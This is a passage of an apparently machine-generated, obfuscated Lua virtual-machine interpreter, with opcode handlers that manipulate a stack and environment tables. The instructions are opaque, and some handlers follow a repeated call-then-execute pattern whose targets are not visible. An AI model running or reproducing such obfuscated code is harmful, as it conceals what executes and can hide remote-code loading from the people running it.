                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
              elseif (Enum > 244) then
                local A;
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Stk[Inst[4]]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]][Stk[Inst[3]]] = Stk[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
              else
                local B = Stk[Inst[4]];
                if B then
                  VIP = VIP + 1;
                else
                  Stk[Inst[2]] = B;
                  VIP = Inst[3];
                end
              end
            elseif (Enum <= 247) then
              if (Enum == 246) then
                local Edx;
                local Results, Limit;
                local B;
                local A;
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                Top = (Limit + A) - 1;
                Edx = 0;
                for Idx = A, Top do
                  Edx = Edx + 1;
                  Stk[Idx] = Results[Edx];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]]();
                VIP = VIP + 1;
                Inst = Instr[VIP];
                do
                  return;
                end
              else
                local Edx;
                local Results, Limit;
                local B;
                local A;
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3] ~= 0;
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                Top = (Limit + A) - 1;
                Edx = 0;
                for Idx = A, Top do
                  Edx = Edx + 1;
                  Stk[Idx] = Results[Edx];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]]();
                VIP = VIP + 1;
                Inst = Instr[VIP];
                do
                  return;
                end
              end
            elseif (Enum == 248) then
              local Edx;
              local Results, Limit;
              local B;
              local A;
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              B = Stk[Inst[3]];
              Stk[A + 1] = B;
              Stk[A] = B[Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
              Top = (Limit + A) - 1;
              Edx = 0;
              for Idx = A, Top do
                Edx = Edx + 1;
                Stk[Idx] = Results[Edx];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]]();
              VIP = VIP + 1;
              Inst = Instr[VIP];
              do
                return;
              end
            else
              local B;
              local A;
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Stk[A] = Stk[A](Stk[A + 1]);
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]][Inst[3]] = Inst[4];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              B = Stk[Inst[3]];
              Stk[A + 1] = B;
              Stk[A] = B[Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              B = Stk[Inst[3]];
              Stk[A + 1] = B;
              Stk[A] = B[Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              B = Stk[Inst[3]];
              Stk[A + 1] = B;
              Stk[A] = B[Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Stk[A](Stk[A + 1]);
              VIP = VIP + 1;
              Inst = Instr[VIP];
              do
                return;
              end
            end
          elseif (Enum <= 274) then
            if (Enum <= 261) then
              if (Enum <= 255) then
                if (Enum <= 252) then
                  if (Enum <= 250) then
                    local Edx;
                    local Results, Limit;
                    local B;
                    local A;
                    if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                      Stk[Inst[2]] = Env;
                    else
                      Stk[Inst[2]] = Env[Inst[3]];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                      Stk[Inst[2]] = Env;
                    else
                      Stk[Inst[2]] = Env[Inst[3]];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    B = Stk[Inst[3]];
                    Stk[A + 1] = B;
                    Stk[A] = B[Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3] ~= 0;
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                    Top = (Limit + A) - 1;
                    Edx = 0;
                    for Idx = A, Top do
                      Edx = Edx + 1;
                      Stk[Idx] = Results[Edx];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]]();
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    do
                      return;
                    end
                  elseif (Enum == 251) then
                    Upvalues[Inst[3]] = Stk[Inst[2]];
                  else
                    local B;
                    local A;
                    Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    Stk[A] = Stk[A](Stk[A + 1]);
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    B = Stk[Inst[3]];
                    Stk[A + 1] = B;
                    Stk[A] = B[Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    Stk[A] = Stk[A](Stk[A + 1]);
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Upvalues[Inst[3]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Stk[Inst[3]] - Inst[4];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    if (Stk[Inst[2]] <= Stk[Inst[4]]) then
                      VIP = VIP + 1;
                    else
                      VIP = Inst[3];
                    end
                  end
                elseif (Enum <= 253) then
                  local Edx;
                  local Results, Limit;
                  local B;
                  local A;
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                  Top = (Limit + A) - 1;
                  Edx = 0;
                  for Idx = A, Top do
                    Edx = Edx + 1;
                    Stk[Idx] = Results[Edx];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]]();
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  do
                    return;
                  end
                elseif (Enum > 254) then
                  local Edx;
                  local Results, Limit;
                  local B;
                  local A;
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                  Top = (Limit + A) - 1;
                  Edx = 0;
                  for Idx = A, Top do
                    Edx = Edx + 1;
                    Stk[Idx] = Results[Edx];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]]();
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  do
                    return;
                  end
                else
                  local Edx;
                  local Results, Limit;
                  local B;
                  local A;
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                  Top = (Limit + A) - 1;
                  Edx = 0;
                  for Idx = A, Top do
                    Edx = Edx + 1;
                    Stk[Idx] = Results[Edx];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]]();
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  do
                    return;
                  end
                end
              elseif (Enum <= 258) then
                if (Enum <= 256) then
                  local Edx;
                  local Results, Limit;
                  local B;
                  local A;
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                  Top = (Limit + A) - 1;
                  Edx = 0;
                  for Idx = A, Top do
                    Edx = Edx + 1;
                    Stk[Idx] = Results[Edx];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]]();
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  do
                    return;
                  end
                elseif (Enum > 257) then
                  local B;
                  local A;
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A](Unpack(Stk, A + 1, Inst[3]));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  do
                    return;
                  end
                else
                  local B;
                  local A;
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                end
              elseif (Enum <= 259) then
                local Edx;
                local Results, Limit;
                local B;
                local A;
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3] ~= 0;
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                Top = (Limit + A) - 1;
                Edx = 0;
                for Idx = A, Top do
                  Edx = Edx + 1;
                  Stk[Idx] = Results[Edx];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]]();
                VIP = VIP + 1;
                Inst = Instr[VIP];
                do
                  return;
                end
              elseif (Enum > 260) then
                local Edx;
                local Results, Limit;
                local B;
                local A;
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3] ~= 0;
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                Top = (Limit + A) - 1;
                Edx = 0;
                for Idx = A, Top do
                  Edx = Edx + 1;
                  Stk[Idx] = Results[Edx];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A]();
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = {};
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]][Inst[3]] = Inst[4];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]][Inst[3]] = Inst[4];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A](Unpack(Stk, A + 1, Inst[3]));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                do
                  return;
                end
              else
                local B;
                local A;
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A](Unpack(Stk, A + 1, Inst[3]));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A](Unpack(Stk, A + 1, Inst[3]));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
              end
            elseif (Enum <= 267) then
              if (Enum <= 264) then
                if (Enum <= 262) then
                  local A;
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                elseif (Enum > 263) then
                  local B;
                  local A;
                  Upvalues[Inst[3]] = Stk[Inst[2]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Upvalues[Inst[3]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A](Unpack(Stk, A + 1, Inst[3]));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Upvalues[Inst[3]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Upvalues[Inst[3]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
                else
                  local K;
                  local B;
                  local A;
                  A = Inst[2];
                  Stk[A](Unpack(Stk, A + 1, Inst[3]));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  B = Inst[3];
                  K = Stk[B];
                  for Idx = B + 1, Inst[4] do
                    K = K .. Stk[Idx];
                  end
                  Stk[Inst[2]] = K;
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A](Unpack(Stk, A + 1, Inst[3]));
                end
              elseif (Enum <= 265) then
                local Edx;
                local Results, Limit;
                local B;
                local A;
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3] ~= 0;
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                Top = (Limit + A) - 1;
                Edx = 0;
                for Idx = A, Top do
                  Edx = Edx + 1;
                  Stk[Idx] = Results[Edx];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]]();
                VIP = VIP + 1;
                Inst = Instr[VIP];
                do
                  return;
                end
              elseif (Enum > 266) then
                local A;
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]] / Inst[4];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Env[Inst[3]] = Stk[Inst[2]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
